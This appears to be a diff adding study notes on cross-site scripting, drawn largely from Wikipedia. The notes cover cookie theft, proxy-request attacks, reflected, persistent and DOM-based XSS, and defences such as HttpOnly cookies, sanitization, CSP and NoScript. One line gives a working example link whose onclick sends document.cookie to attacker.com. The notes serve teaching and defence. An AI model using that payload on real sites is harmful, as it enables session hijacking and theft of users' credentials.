@@ -1,0 +1,134 @@
+XSS
+Cross-site scripting: a cookie that should be only exchanged between a server and a client is sent to another party.
+a type of computer security vulnerability typically found in web applications.
+a case of code injection.
+may be used by attackers to bypass access controls such as the same-origin policy.
+
+==Cross-site scripting: cookie theft
+Cookies can also be stolen using a technique called cross-site scripting.
+This occurs when an attacker takes advantage of a website that allows its users to post
+unfiltered HTML and JavaScript content.
+
+As an example, an attacker may post a message on www.example.com with the following link:
+
+<a href="#" onclick="window.location = 'http://attacker.com/stole.cgi?text=' + escape(document.cookie); return false;">
+Click here!</a>
+
+When another user clicks on this link, the browser executes the piece of code within the onclick attribute,
+thus replacing the string document.cookie with the list of cookies that are accessible from the current page.
+As a result, this list of cookies is sent to the attacker.com server.
+If the attacker's malicious posting is on an HTTPS website https://www.example.com, secure cookies will
+also be sent to attacker.com in plain text.
+
+How to fix?
+1>It is the responsibility of the website developers to filter out such malicious code.
+2>Such attacks can be mitigated by using HttpOnly cookies.
+These cookies will not be accessible by client-side scripting languages like JavaScript,
+and therefore, the attacker will not be able to gather these cookies
+
+
+==Cross-site scripting: proxy request
+In older versions of many browsers, there were security holes allowing attackers to script a proxy request
+by using the client-side XMLHttpRequest API.
+For example, a victim is reading an attacker's posting on www.example.com,
+and the attacker's script is executed in the victim's browser.
+The script generates a request to www.example.com with the proxy server 'attacker.com'.
+Since the request is for www.example.com, all example.com cookies will be sent along with the request,
+but routed through the attacker's proxy server. Hence, the attacker would be able to harvest the victim's cookies.
+
+How to fix?
+This attack would not work with secure cookies, since they can only be transmitted over HTTPS connections,
+and the HTTPS protocol dictates end-to-end encryption
+(i.e. the information is encrypted on the user's browser and decrypted on the destination server).
+In this case, the proxy server would only see the raw, encrypted bytes of the HTTP request.
+==========================================================================================
+
+Types
+  XSS flaws: non-persistent and persistent.
+  Some sources further divide these two groups into traditional (caused by server-side code flaws)
+  and DOM-based (in client-side code).
+
+  Reflected (non-persistent)
+    the data provided by a web client, most commonly in HTTP query parameters (e.g. HTML form submission),
+    is used immediately by server-side scripts to parse and display a page of results for and to that user,
+    without properly sanitizing the request
+    any non-validated user-supplied data included in the resulting page without proper HTML encoding,
+    may lead to markup injection
+    A reflected attack is typically delivered via email or a neutral web site.
+    The bait is an innocent-looking URL, pointing to a trusted site but containing the XSS vector.
+    If the trusted site is vulnerable to the vector, clicking the link can cause the victim's browser to execute
+    the injected script.
+  Persistent
+     it occurs when the data provided by the attacker is saved by the server, and then permanently displayed on
+     "normal" pages returned to other users in the course of regular browsing, without proper HTML escaping.
+     A classic example of this is with online message boards where users are allowed to post HTML formatted messages
+     for other users to read.
+     For example, suppose a dating website.for the question "Describe your Ideal First Date", Mallory
+     gives a short answer (to appear normal) but the text at the end of her answer is her script to steal names
+     and emails. If the script is enclosed inside a <script> element, it won't be shown on the screen. Then
+     suppose that Bob, a member of the dating site, reaches Mallory’s profile, which has her answer to the
+     First Date question. Her script is run automatically by the browser and steals a copy of Bob’s
+     real name and email directly from his own machine.
+     Any data received by the web application (via email, system logs, IM etc.)
+     that can be controlled by an attacker could become an injection vector.
+  Server-side versus DOM-based vulnerabilities
+     In a DOM-based XSS attack, the malicious data does not touch the web server.
+     Rather, it is being reflected by the JavaScript code, fully on the client side.
+     the bug found in 2011 in a number of JQuery plugins.
+     Prevention strategies for DOM-based XSS attacks include very similar measures to
+     traditional XSS prevention strategies but implemented in JavaScript code and contained in web pages
+     (i.e. input validation and escaping),Some JavaScript frameworks have built-in countermeasures against
+     this and other types of attack — for example Angular.js
+  Self-XSS
+
+Exploit examples
+The Browser Exploitation Framework could be used to attack the web site and the user's local environment.
+
+Non-persistent
+Several things could have been done to mitigate this attack:
+*The search input could have been sanitized which would include proper encoding checking.
+The web server could be set to redirect invalid requests.
+*The web server could detect a simultaneous login and invalidate the sessions.
+*The web server could detect a simultaneous login from two different IP addresses and invalidate the sessions.
+*The website could display only the last few digits of a previously used credit card.
+*The website could require users to enter their passwords again before changing their registration information.
+The website could enact various aspects of the Content Security Policy.
+
+https://en.wikipedia.org/wiki/Content_Security_Policy
+
+Users could be educated to not click "benign-looking", but malicious, links.
+*Set cookie with HttpOnly flag to prevent access from JavaScript.
+
+Persistent attack
+website software should have stripped out the script tag or done something to make sure it didn't work
+
+
+Preventive measures
+  Contextual output encoding/escaping of string input
+     HTML entity encoding, JavaScript escaping, CSS escaping, and URL (or percent) encoding
+     security encoding libraries are usually easier to use.
+
+  Safely validating untrusted HTML input
+    Untrusted HTML input must be run through an HTML sanitization engine to ensure that it does not contain XSS code.
+
+    https://en.wikipedia.org/wiki/HTML_sanitization
+
+
+  Cookie security
+    when handling cookie-based user authentication
+  Disabling scripts
+    While Web 2.0 and Ajax developers require the use of JavaScript,
+    some web applications are written to allow operation without the need for any client-side scripts.
+    This allows users, if they choose, to disable scripting in their browsers before using the application.
+    Some browsers or browser plugins can be configured to disable client-side scripts on a per-domain basis.
+    A solution for Firefox and other Gecko-based browsers is the open source NoScript add-on which,
+    in addition to the ability to enable scripts on a per-domain basis,
+    provides some XSS protection even when scripts are enabled,The Firefox NoScript extension enables users to
+    allow scripts selectively from a given page while disallowing others on the same page.
+    For example, scripts from example.com could be allowed, while scripts from advertisingagency.com that are
+     attempting to run on the same page could be disallowed
+  Emerging defensive technologies
+     1 Content Security Policy,
+     2 Javascript sandbox tools,
+     3 auto-escaping templates
+  Scanning service
